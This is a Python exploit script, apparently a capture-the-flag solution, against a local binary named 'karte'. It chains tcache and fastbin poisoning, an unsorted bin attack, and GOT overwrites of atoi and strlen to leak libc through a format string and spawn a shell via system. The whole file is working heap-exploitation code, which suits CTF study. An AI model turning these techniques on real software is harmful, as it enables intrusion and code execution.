from ptrlib import *

def add(size, desc):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))
    sock.sendafter("> ", desc)
    sock.recvuntil("id ")
    return int(sock.recvline())

def delete(id):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(id))
    return

def modify(id, desc):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("id > ", str(id))
    sock.sendafter("description > ", desc)
    return

def rename(name):
    sock.sendlineafter("> ", "99")
    sock.sendafter("... ", name)
    return

elf = ELF("./karte")
libc = ELF("./libc-2.27.so")
sock = Process("./karte")
addr_name = elf.symbol("name")
addr_target = 0x602110
delta = 0xe7

# make name be a chunk
name  = p64(0) + p64(0x71)
name += p64(addr_name + 0x50) + p64(0)
sock.sendafter("... ", name[:0x3f])

for i in range(7):
    z = add(0x68, "Z" )
    delete(z)
for i in range(7):
    z = add(0x88, "Z" )
    delete(z)
y = add(0x68, "A")
x = add(0x68, "A")
delete(y)
delete(x)
modify(x, p64(addr_name)[:4])
y = add(0x68, "A")
fake_chunk = b"A" * 0x40
fake_chunk += p64(0) + p64(0x71)
fake_chunk += p64(addr_name)
x = add(0x68, fake_chunk) # name
fake_chunk = b"A" * 0x30
fake_chunk += p64(0) + p64(0x21) # @fakeA
fake_chunk += p64(0) * 2
fake_chunk += p64(0) + p64(0x21)
z = add(0x68, fake_chunk) # name + 0x50

rename(p64(0) + p64(0x91))
delete(x)
rename(p64(0) + p64(0x91) + p64(0) + p64(addr_target - 0x15 + 8))
delete(y)
fake_chunk = b'A' * 0x60
fake_chunk += p64(0) + p64(0x21) # don't worry we have @fakeA next
x = add(0x88, fake_chunk) # unsorted bin attack

# overwrite list and lock
rename(p64(0) + p64(0x71))
delete(x)
rename(p64(0) + p64(0x71) + p64(addr_target))
x = add(0x68, "A")
new_id1, new_id3 = 0x1, 0x3
fake_data  = b'/bin/sh\x00' + p64(0) # zfd, rfd
fake_data += p64(0) * 2
fake_data += p32(1) + p32(new_id1) + p64(elf.got("atoi"))   # list[0]
fake_data += p32(0) + p32(0) + p64(0)                       # list[1] == y
fake_data += p32(1) + p32(new_id3) + p64(elf.got("strlen")) # list[2]
fake_data += p64(0xdeadc0bebeef) # lock
y = add(0x68, fake_data)

# GOT overwrite (atoi)
modify(new_id1, p64(elf.plt("printf"))[:6])

# leak libc
sock.sendlineafter("> ", "%19$p.")
libc_base = int(sock.recvuntil(".").rstrip(b"."), 16) - libc.symbol("__libc_start_main") - delta
logger.info("libc base = " + hex(libc_base))

# GOT overwrite (system)
sock.sendlineafter("> ", "%4c") # modify
sock.sendlineafter("id > ", "%{}c".format(new_id3))
sock.sendafter("> ", p64(libc_base + libc.symbol("system"))[:6])

# get the shell!
sock.sendlineafter("> ", "%4c") # modify
sock.sendlineafter("id > ", "%{}c".format(0x58))

sock.interactive()
